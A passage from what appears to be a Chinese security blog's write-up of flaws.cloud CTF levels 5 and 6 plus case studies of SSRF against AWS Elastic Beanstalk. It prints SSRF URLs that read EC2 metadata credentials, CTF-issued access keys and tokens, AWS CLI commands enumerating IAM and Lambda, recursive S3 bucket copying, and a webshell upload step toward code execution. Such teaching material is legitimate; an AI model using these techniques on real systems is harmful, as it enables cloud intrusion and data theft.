...</span><br><span class="line">    * Secret key: ...</span><br><span class="line">    * Policy name: nimbostratusbdkgpnenu</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>上面是这个工具的使用方法，我在vps测试没使用成功</p>
+<p>我们用代理服务访问以下 <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank" rel="noopener">metadata</a> 地址</p>
+<p><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/" target="_blank" rel="noopener">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/</a></p>
+<p><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/" target="_blank" rel="noopener">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Code&quot; : &quot;Success&quot;,</span><br><span class="line">  &quot;LastUpdated&quot; : &quot;2019-08-21T04:57:19Z&quot;,</span><br><span class="line">  &quot;Type&quot; : &quot;AWS-HMAC&quot;,</span><br><span class="line">  &quot;AccessKeyId&quot; : &quot;ASIA6GG7PSQGR2FMOAFH&quot;,</span><br><span class="line">  &quot;SecretAccessKey&quot; : &quot;cQoi4VN5VYtDGC91RIu8TifkMEuGchr/BRKqpW0z&quot;,</span><br><span class="line">  &quot;Token&quot; : &quot;AgoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJHMEUCIQCmBj0Y0Vxr8m+cXbZ3Ek4K0HIPb7AIcVfjNypRgzHC2gIgGWah2EmRgnXIwX9hIpqqw+lyU/VBpg2GsECgWShZ5Bgq4wMItv//////////ARAAGgw5NzU0MjYyNjIwMjkiDBcqeZCc20c/yiG+ISq3A+isuPcVzg1MOfb7Z9C/ksL+g1kTpbwGxhEDbgfn+OEfOEo4SY6rAS3wsyOVA9jonftI0cF8x3yLbK7k0AG8FW7njVE5zWCUtKt39xBIP/Q32FhDHxRXtOfoaev+By0dY+QQvePRfLMKNkvjF1JBH1qM2TZVj3He+L+A+E6jUtGkfPofVru8x/pE+77AxGspCS40UNZjCku9+yWmUCX0q1MRlgocspVrcB21w2uXyAlNWdi4imbn0YVGrPpu4MlCwCWrN8sUP/QSXaG13ym5J8l3Gsa6wM+AHQTL7IMAT16YCWPVRsItTx+4H8MOs0mVLW48fCIQjNB4rDz1SboroW6urcGRCNTAkRCcbVSoLzvPG2A040erNJQaonihsBu8dWluNg/uCmta0ROIk1/GVSNgzYK4ahBXPh5vSumuyieXnEZZm+tlLkVVYRIK+v/PzNYP2HNfYjR0vnHBRE3TgM+9OHo1kyRDqoQxxfeheqwBfFNSymaCefNpQ1s/Tu5ph+PXmgJpiMabSF7B0u2kmwH8aKQgjg4Hznc77d12+4ktkcOnoCMmv41Xvla4Sa6YCpSi4w8mL/0wvp7z6gU6tAGkI3ecrtsK4nHfsNVvPt8zfLLN/frGfs/6u15Iylsj488miTrFD/5syjINJ1KVML2XregyplIkrYE1c1TW+JlfiPO8GUGR0oMd8lVXmL5iMzDVpiyT8km/OtjMh6i/ge/94ph+/y/vSUcGPFQJHty19XWqeV98QiPFFaaWjBm868p2ZnbhWppkHmHO1b7NLmCixHfnEeqZFNEDzw+5KijHNWKkL2URu7/a/z0SxXamP7Zf92c=&quot;,</span><br><span class="line">  &quot;Expiration&quot; : &quot;2019-08-21T11:29:30Z&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到了EC2的IAM角色提供的AWS凭证，该角色允许你使用以下内容列出你知道存在于.git repo密钥的6级存储桶的内容：</p>
+<p>按照同样的方式，建立一个新的 level5 profile，然后读取 level6 的内容，e.g</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.aws/credentials 写入</span><br><span class="line">aws_access_key_id = ASIAJO7K65L4SF2H46NA</span><br><span class="line">aws_secret_access_key = aRSf3r0kGDAjDrfu4MvT4fbogSVnTgmhNEjDMydo</span><br><span class="line">aws_session_token = FQoDYXdzEDcaDHXfBLcFnxqv3Fs8aiK3A5gdfngeeKowhp9CvklC1QeshSXdMmyfS6rkPizvGpt3l5LrhqxEg7BLnCBllxpbbILZ+9H4bhGMPR7dXR3mc32L5y8zm2+0VszTewxXbKG0Sf3EjDRJZBOzwPJZmlpn0oVsAnqYhkk9fpOVAFOPSufsaKNWF6vAHl2jT9dANWExumXT9Rc4ZR9jKc7xhxYEcxXBoKr+xFYiblki6FkqGlfIChLz/4EZsEdjYCd/2HAQyMOMe1d/KPE0nE8srIBN5aBoXbddcL6ix1xGpAEfNBhxI3UwVp5eMU5cskyRQlk3wtQYuXfL8xprOqYSf1KwmSyhHEgDOwZgc+SmiV2tbA5RfuWz48aU2NfZnu5xQqnpW7NwyQaRfXbfewNlYMPzRUH4sX441RGl1JYK5PWfsdvyEXbaxUKMNMrASqQpFboPefyXasYFEuZQFdgkHy5oRG3vBrIzf4O9U+gDM+kUUJf5YmBy9vmjzLv4N2SM0kzB/uAQaPmAHS9aMzeaZIJcze35snBSDtb+IJ3T2V5p93rDtKCkuKAe1M30JFzS3EdL6An7zZ/VRSSJ2fM86699LE5bMeWlr+so05/NxQU=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-21_13-58-41.png" alt></p>
+<p>IP地址<code>169.254.169.254</code>是云世界中的神奇IP。AWS，Azure，Google，DigitalOcean和其他人使用此功能允许云资源查找有关自身的元数据。有些人，比如谷歌，对请求有其他限制，例如要求它使用<code>Metadata-Flavor: Google</code>：谷歌”作为HTTP标头，并拒绝使用<code>X-Forwarded-For</code>标头的请求。AWS没有约束。如果可以<strong>从EC2向该IP发出任何类型的HTTP请求</strong>，可能会收到所有者希望你看不到的信息。</p>
+<p>这个问题的例子</p>
+<ul>
+<li><a href="https://twitter.com/Agarri_FR" target="_blank" rel="noopener">NicolasGrégoire</a>发现prezi允许你将服务器指向URL以将内容包含在幻灯片中，这使你可以指向169.254.169.254，它为EC2 intance配置文件（<a href="https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a" target="_blank" rel="noopener">链接</a>）提供了访问密钥。他还发现了使用<a href="https://hackerone.com/reports/53088" target="_blank" rel="noopener">Phabricator</a>和<a href="https://hackerone.com/reports/53004" target="_blank" rel="noopener">Coinbase</a>访问神奇IP的问题。</li>
+</ul>
+<p>访问IAM配置文件访问密钥的类似问题是访问EC2的用户数据，人们有时会使用这些数据将密钥传递给EC2，例如API密钥或凭证。</p>
+<p><strong>修复建议</strong></p>
+<p>确保你的应用程序不允许访问<code>169.254.169.254</code>或任何本地和专用IP范围。此外，请确保尽可能限制IAM角色。</p>
+<h2 id="ctf6-IAM策略错误"><a href="#ctf6-IAM策略错误" class="headerlink" title="ctf6 IAM策略错误"></a>ctf6 IAM策略错误</h2><p><a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/" target="_blank" rel="noopener">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a></p>
+<blockquote>
+<p>对于最后的挑战，你将获得一个附有SecurityAudit策略的用户访问密钥。了解它可以做什么以及你在此AWS账户中可能找到的其他内容。</p>
+<p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>Secret: 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</p>
+</blockquote>
+<p>SecurityAudit组可以对AWS账户中的资源进行高级概述，但对于<strong>查看IAM策略</strong>也很有用。首先，找出你是谁（假设你将你的个人资料命名为“level6”）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile level6 iam get-user</span><br><span class="line">&#123;</span><br><span class="line">    &quot;User&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-26T23:11:16Z&quot;,</span><br><span class="line">        &quot;UserName&quot;: &quot;Level6&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/Level6&quot;,</span><br><span class="line">        &quot;UserId&quot;: &quot;AIDAIRMDOSCWGLCDWOG6A&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在你知道你的用户名是Level6，你可以找到附加到它的策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile level6 iam list-attached-user-policies --user-name Level6</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AttachedPolicies&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;MySecurityAudit&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/MySecurityAudit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">(env) ---</span><br></pre></td></tr></table></figure>
+
+<p>一旦你知道该策略的ARN，你就可以获得它的版本ID：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile level6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &#123;</span><br><span class="line">        &quot;IsAttachable&quot;: true,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;,</span><br><span class="line">        &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">        &quot;PolicyId&quot;: &quot;ANPAIRLWTQMGKCSPGTAIO&quot;,</span><br><span class="line">        &quot;PermissionsBoundaryUsageCount&quot;: 0,</span><br><span class="line">        &quot;AttachmentCount&quot;: 1,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:45:17Z&quot;,</span><br><span class="line">        &quot;DefaultVersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Description&quot;: &quot;List apigateways&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;UpdateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在你已拥有ARN和版本ID，你可以看到实际的策略是什么：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile level6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4</span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: true,</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Resource&quot;: &quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;,</span><br><span class="line">                    &quot;Action&quot;: [</span><br><span class="line">                        &quot;apigateway:GET&quot;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这告诉我们使用这个策略我们可以在<code>&quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;</code>上调用<code>&quot;apigateway:GET&quot;</code></p>
+<p>使用它，它应该引导你到隐藏资源的方向。</p>
+<p>你现在知道你有能力GET <code>&quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;</code></p>
+<p>在这种情况下，API网关用于调用lambda函数，但你需要弄清楚如何调用它。</p>
+<p>SecurityAudit策略可以让你看到有关<strong>lambdas</strong>的一些信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --region us-west-2 --profile level6 lambda list-functions</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Functions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Role&quot;: &quot;arn:aws:iam::975426262029:role/service-role/Level6&quot;,</span><br><span class="line">            &quot;Runtime&quot;: &quot;python2.7&quot;,</span><br><span class="line">            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-west-2:975426262029:function:Level6&quot;,</span><br><span class="line">            &quot;FunctionName&quot;: &quot;Level6&quot;,</span><br><span class="line">            &quot;Timeout&quot;: 3,</span><br><span class="line">            &quot;TracingConfig&quot;: &#123;</span><br><span class="line">                &quot;Mode&quot;: &quot;PassThrough&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;LastModified&quot;: &quot;2017-02-27T00:24:36.054+0000&quot;,</span><br><span class="line">            &quot;CodeSha256&quot;: &quot;2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=&quot;,</span><br><span class="line">            &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;,</span><br><span class="line">            &quot;MemorySize&quot;: 128,</span><br><span class="line">            &quot;Version&quot;: &quot;$LATEST&quot;,</span><br><span class="line">            &quot;CodeSize&quot;: 282,</span><br><span class="line">            &quot;Description&quot;: &quot;A starter AWS Lambda function.&quot;,</span><br><span class="line">            &quot;Handler&quot;: &quot;lambda_function.lambda_handler&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这告诉你有一个名为“Level6”的函数，SecurityAudit还允许你运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &quot;&#123;\&quot;Version\&quot;:\&quot;2012-10-17\&quot;,\&quot;Id\&quot;:\&quot;default\&quot;,\&quot;Statement\&quot;:[&#123;\&quot;Sid\&quot;:\&quot;904610a93f593b76ad66ed6ed82c0a8b\&quot;,\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Principal\&quot;:&#123;\&quot;Service\&quot;:\&quot;apigateway.amazonaws.com\&quot;&#125;,\&quot;Action\&quot;:\&quot;lambda:InvokeFunction\&quot;,\&quot;Resource\&quot;:\&quot;arn:aws:lambda:us-west-2:975426262029:function:Level6\&quot;,\&quot;Condition\&quot;:&#123;\&quot;ArnLike\&quot;:&#123;\&quot;AWS:SourceArn\&quot;:\&quot;你33ppypa75/*/GET/level6\&quot;&#125;&#125;&#125;]&#125;&quot;,</span><br><span class="line">    &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这告诉你能够执行<code>arn：aws：execute-api：us-west-2：975426262029：s33ppypa75 / * / GET / level6 \</code>那个“s33ppypa75”是一个rest-api-id，你可以与其他附加政策一起使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~/aws » aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id &quot;s33ppypa75&quot;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;item&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;tracingEnabled&quot;: false,</span><br><span class="line">            &quot;cacheClusterStatus&quot;: &quot;NOT_AVAILABLE&quot;,</span><br><span class="line">            &quot;createdDate&quot;: 1488155168,</span><br><span class="line">            &quot;cacheClusterEnabled&quot;: false,</span><br><span class="line">            &quot;deploymentId&quot;: &quot;8gppiv&quot;,</span><br><span class="line">            &quot;stageName&quot;: &quot;Prod&quot;,</span><br><span class="line">            &quot;methodSettings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;lastUpdatedDate&quot;: 1488155168</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这告诉你舞台名称是“Prod”。使用rest-api-id，阶段名称，区域和资源调用Lambda函数，如<a href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6" target="_blank" rel="noopener">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a></p>
+<p><strong>修复建议</strong></p>
+<p>通常为人员和实体提供只读权限，例如SecurityAudit策略。读取你自己和其他IAM策略的能力确实可以帮助攻击者找出你环境中存在的内容并寻找漏洞和错误。</p>
+<p>不要随意分发任何权限，即使只允许你读取元数据或知道你的权限是什么的权限。</p>
+<h1 id="aws案例"><a href="#aws案例" class="headerlink" title="aws案例"></a>aws案例</h1><h2 id="在AWS-Elastic-Beanstalk中利用SSRF"><a href="#在AWS-Elastic-Beanstalk中利用SSRF" class="headerlink" title="在AWS Elastic Beanstalk中利用SSRF"></a>在AWS Elastic Beanstalk中利用SSRF</h2><p>AWS Elastic Beanstalk支持Web Server和Worker环境配置。</p>
+<p>Elastic Beanstalk不会为其创建的Amazon S3 Storage bucket启用默认加密。这意味着默认情况下，对象以未加密的形式存储在Storage bucket中（并且只能由授权用户访问）。</p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/elasticbeanstalk/latest/dg/AWSHowTo.S3.html" target="_blank" rel="noopener">将 Elastic Beanstalk 用于 Amazon S3</a></p>
+<p>Elastic Beanstalk 为您在其中创建环境的每个区域创建一个名为 <code>elasticbeanstalk-*region*-*account-id*</code> 的 Amazon S3 存储桶。Elastic Beanstalk 使用此存储桶存储应用程序正常运行所需的对象，例如，临时配置文件。</p>
+<p>1.应用程序存在服务器端请求伪造（SSRF）漏洞</p>
+<p>漏洞链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://staging.xxxx-redacted-xxxx.com/view_pospdocument.php?doc=http://localhost/server-status</span><br></pre></td></tr></table></figure>
+
+<p>2.通过<a href="https://ipinfo.io/account?service=github&loginState=create" target="_blank" rel="noopener">服务器指纹识别</a>确认服务提供商是亚马逊</p>
+<p>3.ssrf查询aws api，检索了访问密钥，秘密访问密钥和令牌：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view_pospdocument.php?doc=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role</span><br></pre></td></tr></table></figure>
+
+<p>4.配置AWS命令行界面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile myaccount</span><br></pre></td></tr></table></figure>
+
+<p>验证你是否已代入 IAM 角色，获取Account</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>
+
+<p>5.AWS CLI以递归方式列出了bucket resources</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3://elasticbeanstalk-us-east-2-69XXXXXXXX79/</span><br></pre></td></tr></table></figure>
+
+<p>6.递归复制所有S3 Bucket Data</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://elasticbeanstalk-us-east-2-69XXXXXXXX79/ /home/foobar/awsdata -recursive</span><br></pre></td></tr></table></figure>
+
+<p><strong>7.ssrf-&gt;rce</strong></p>
+<p>上传webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp /home/webshell.php s3://elasticbeanstalk-us-east-2-69XXXXXXXX79/webshell.php</span><br></pre></td></tr></table></figure>
+
+<p>上传失败，返回404</p>
+<p>8.添加管道</p>
+<p>软件版本使用AWS Pipeline，S3存储桶作为源存储库，Elastic Beanstalk作为部署提供程序自动执行</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/awssource1.png" alt></p>
+<p>9.跳过构建阶段</p>
+<p>10.添加部署提供程序</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/awscode-pipeline.png" alt></p>
+<p>10.成功创建新管道<br>现在，是时候在S3 bucket 中上传一个新文件（webshell）来执行系统级命令，如图19所示：</p>
+<p>11.在源提供程序中配置的对象中添加该文件</p>
+<p>12.在对象中添加webshell，使用AWS CLI命令将存档文件上载到S3 bucket</p>
+<p>13.CodePipeline立即启动构建过程</p>
+<p>14.管道触发</p>
+<p><a href="https://xz.aliyun.com/t/4088" target="_blank" rel="noopener">https://xz.aliyun.com/t/4088</a></p>
+<p><a href="https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/" target="_blank" rel="noopener">https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/</a></p>
+<h2 id="从SSRF到最终获取AWS-S3-Bucket访问权限的实际案例"><a href="#从SSRF到最终获取AWS-S3-Bucket访问权限的实际案例" class="headerlink" title="从SSRF到最终获取AWS S3 Bucket访问权限的实际案例"></a>从SSRF到最终获取AWS S3 Bucket访问权限的实际案例</h2><p>1.找到ssrf触发点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">downloadcallback/download_handler.php?path=</span><br></pre></td></tr></table></figure>
+
+<p>存在本地文件包含，ssrf</p>
+<p>file:/// , dict:// , ftp:// and gopher://读取本地文件内容</p>
+<p>2.读取了/etc/motd文件，该文件表明该应用程序是通过AWS ElasticBeanstalk部署的</p>
+<p>通过SSRF搜索AWS实例元数据和用户数据</p>
+<p>从以下API中检索AWS账户ID和Region</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">downloadcallback/download_handler.php?path=http://169.254.169.254/latest/dynamic/instance-identity/document</span><br></pre></td></tr></table></figure>
+
+<p>3.获取AWS Access Key，Secret Access Key和Token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">downloadcallback/download_handler.php?path=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.freebuf.com/articles/web/198687.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/198687.html</a></p>
+<h2 id="配置错误的AWS到AWS-Bucket-Takeover的信息泄露"><a href="#配置错误的AWS到AWS-Bucket-Takeover的信息泄露" class="headerlink" title="配置错误的AWS到AWS Bucket Takeover的信息泄露"></a>配置错误的AWS到AWS Bucket Takeover的信息泄露</h2><p>1.找到aws存储桶的png图片 s3.region.amazonaws.com/downloads/xxx.png</p>
+<p>2.访问s3.region.amazonaws.com/downloads/ 发现信息泄露，遍历所列出的文件</p>
+<p>3.下载zip文件</p>
+<p>4.发现<code>document.wflow</code>文件包含了我需要收集AWS Bucket的所有内容</p>
+<p>5.使用<code>access_key</code>和<code>secret_key</code>进行登陆</p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/08/20/aws安全问题/" title="aws安全问题">https://wh0ale.github.io/2019/08/20/aws安全问题/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/AWS/" rel="tag"><i class="fa fa-tag"></i># AWS</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/08/19/2018-12-08-Splunk shell/" rel="next" title="Splunk Shell">
+                <i class="fa fa-chevron-left"></i> Splunk Shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/08/21/PHP-Audit-Labs-Day7-parse-str函数缺陷/" rel="prev" title="PHP-Audit-Labs-Day6-parse_str函数缺陷">
+                PHP-Audit-Labs-Day6-parse_str函数缺陷 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
